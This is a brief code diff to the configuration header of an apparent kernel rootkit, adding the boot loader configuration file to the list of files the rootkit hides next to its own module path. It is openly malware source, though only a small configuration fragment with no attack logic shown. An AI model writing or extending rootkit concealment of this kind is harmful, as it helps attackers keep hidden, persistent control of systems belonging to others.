@@ -33,9 +33,10 @@
 #define RKCALL_DIE "41580f3e3b18a4dadf03d128b9fa9ab80a5b6ac088ee5f713559fa7ba59c5a6d"
 
 /* Hidden files. */
-#define NUM_HIDDEN_FILES 1
+#define NUM_HIDDEN_FILES 2
 static const char *hidden_files[NUM_HIDDEN_FILES] = {
 	"/boot/modules/rootkit.ko",
+	"/boot/loader.conf",
 };
 
 #endif /* CONFIG_H */
